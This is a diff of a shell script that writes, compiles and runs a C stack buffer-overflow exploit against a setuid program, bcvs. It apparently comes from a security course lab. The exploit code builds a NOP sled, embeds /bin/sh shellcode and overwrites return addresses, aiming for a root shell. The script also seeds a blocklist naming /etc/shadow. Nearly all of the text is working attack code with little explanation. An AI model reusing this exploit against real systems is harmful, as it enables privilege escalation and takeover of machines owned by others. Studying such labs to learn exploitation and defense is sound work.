@@ -13,8 +13,21 @@
 # overflow in the copyFile function.
 ## ----------------------------------------------------- ##
 
-EXPLOIT_EXE="../exploit"
-SPLOIT_DIR="sploit7_dir"
+# Setup necessary environment
+REPODIR=".bcvs"
+BLOCKLIST="block.list"
+BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"
+
+mkdir -p sploit1_dir
+cd sploit1_dir
+mkdir -p .bcvs
+touch .bcvs/block.list
+
+#blocklist - Exact copy of the one in bcvs's directory
+echo $REPODIR > $BLOCKLISTPATH
+echo "/etc/" >> $BLOCKLISTPATH
+echo "/etc/shadow" >> $BLOCKLISTPATH
+echo "/sbin/" >> $BLOCKLISTPATH
 
 cat <<EOS > "exploit.c"
 #include <stdlib.h>
@@ -22,12 +35,8 @@ cat <<EOS > "exploit.c"
 #include <string.h>
 
 #define DEFAULT_OFFSET 0
-#define DEFAULT_BSIZE 800
+#define DEFAULT_BSIZE 256
 #define NOP 0x90
-
-#define STOP_ADDR = 560
-#define START_NOPS = 559
-#define START_SHELL_CODE = 720
 
 // Shellcode for exec of /bin/sh
 char shellcode[] =
@@ -48,65 +57,43 @@ void main(int argc, char* argv[]) {
 
   if (argc > 1) offset = atoi(argv[1]);
 
-  //We need to add offset to the stack pointer to have addr be in
-  //argv[2] for this exploit
-  addr = get_sp() + offset; //1139
+  //printf("Offset is: %d\n", offset);
+  //printf("Stack Pointer is: 0x%x\n", get_sp()); 
+  addr = get_sp() - offset;
+  //printf("Using address: 0x%x\n", addr);
 
   ptr = buff;
-  //add 1 to account for shifting the bytes to align on word boundaries
-  long_ptr = (long *) (ptr + 1);
-
-  char *temp = ptr;
-  for (i = 0; temp < (buff+bsize); i++) {
-    *(temp++) = NOP;
-  }
-
-
-  for (i = 0; long_ptr < (buff + STOP_ADDR - 1); i += 4) {
-	*(long_ptr++) = addr;
+  // Shifting by 3 align the addresses with the word boundary when
+  // smashing the stack
+  long_ptr = (long *) (ptr + 3);
+  //First we fill the buffer with our best guess of the address for
+  //the buffer in the attacked program
+  for (i = 0; long_ptr < (buff+bsize-3); i += 4) {
+    *(long_ptr++) = addr;
   }
 
   // Setup the nop sled
-  char *buf_ptr = (char *) (ptr + 559); 
-  for (i = (buff + START_NOPS); i < (buff + bsize); ++i) {
-    *(buf_ptr++) = NOP;
-    //buff[i] = NOP;
-  }
+  for (i = 0; i < (bsize/2); ++i)
+    buff[i] = NOP;
 
   // Insert our shellcode
-  ptr = (buff + START_SHELL_CODE);
+  ptr = buff + (bsize/2);
   for (i = 0; i < strlen(shellcode); ++i) {
     *(ptr++) = shellcode[i];
   }
-
   buff[bsize-1] = '\0';
   printf(buff);
   return;
 }
 EOS
-
-# Setup necessary environment
 gcc -o exploit exploit.c
 
-OFFSET=1139
-
-rm -rf $SPLIOT_DIR
-mkdir -p $SPLOIT_DIR
-cd $SPLOIT_DIR
-mkdir -p .bcvs
-touch .bcvs/block.list
-
-
-SHELL_CODE=$($EXPLOIT_EXE)
+SHELL_CODE=$(./exploit)
 #echo "$SHELL_CODE"
 
-SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
-if [[ $? -ne 0 ]]; then
-  echo "Failed to generate shellcode"
-  exit -1
-fi
+OFFSET=425
+echo "Trying offset: $OFFSET"
+SHELL_CODE=$(./exploit $OFFSET)
+/opt/bcvs/bcvs ci "${SHELL_CODE}"
 
-/opt/bcvs/bcvs co "${SHELL_CODE}"
-
-#/usr/bin/gdb /opt/bcvs/bcvs
 # And then hopefully you have a root shell at this point
